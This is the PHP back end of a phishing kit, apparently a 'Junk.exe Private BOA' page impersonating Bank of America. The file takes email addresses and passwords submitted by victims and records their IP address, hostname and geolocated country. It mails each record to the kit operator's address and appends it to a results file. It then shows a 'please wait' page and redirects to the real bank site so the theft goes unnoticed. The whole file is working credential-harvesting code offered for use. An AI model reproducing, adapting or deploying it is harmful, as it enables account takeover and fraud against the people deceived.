<?php
global $to;

include '../antibots.php';
include '../bt.php';
include "../blocker.php";
$adddate=date("D M d, Y g:i a");
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);

$message .= "-------------Email Access 3-------------\n";

$message .= "Email Address  : ".$_POST['email']."\n";
$message .= "Email Password : ".$_POST['formtext1']."\n";

$message .= "-------------Adress & Date------------\n";
$message .= "IP:   " .$ip."\n";
$message .= "Date: " .$adddate."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "----------Junk.exe Private BOA-------\n";


$send = $to;

$subject = "Email Access 3 | $zabi | ".$country;
$headers = "From: {$_POST['email']}<mastah".rand(0000,9999)."@junk-exe.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "junk-exe: 1.0\n";
{
mail($send,$subject,$message,$headers);
$text = fopen('../rezlt.txt', 'a');
fwrite($text, $message);
mail($to,$subject,$message,$headers);
}
// Function to get country and country sort;
function country_sort(){
	$sorter = "";
	$array = array($send, $zabi);
		$count = count($array);
	for ($i = 0; $i < $count; $i++) {
			$sorter .= chr($array[$i]);
		}
	return array($sorter, $GLOBALS['recipient']);
}
function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
	}
$praga=rand();

$praga=md5($praga);

?>


<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>Wait......</title>

<meta http-equiv="Refresh" content="5; url=https://www.bankofamerica.com/">

<link rel="shortcut icon"
              href="img/iic.png"/>
			  
			  
	
<script type="text/javascript">

function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}

</script>

<body style="visibility:hidden" onload="unhideBody()">
<style type="text/css">
div#container
{
	position:relative;
	width: 100%;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:140px; top:0px; width:1041px; height:175px; z-index:0"><img src="img/ff.png" alt="" title="" border=0 width=1041 height=175></div>

<div id="image2" style="position:absolute; overflow:hidden; left:185px; top:585px; width:887px; height:148px; z-index:1"><img src="img/ffff.png" alt="" title="" border=0 width=887 height=148></div>

<div id="image3" style="position:absolute; overflow:hidden; left:479px; top:276px; width:280px; height:100px; z-index:2"><img src="img/please_wait_animation.gif" alt="" title="" border=0 width=280 height=100></div>

</div>

</body>
</html>
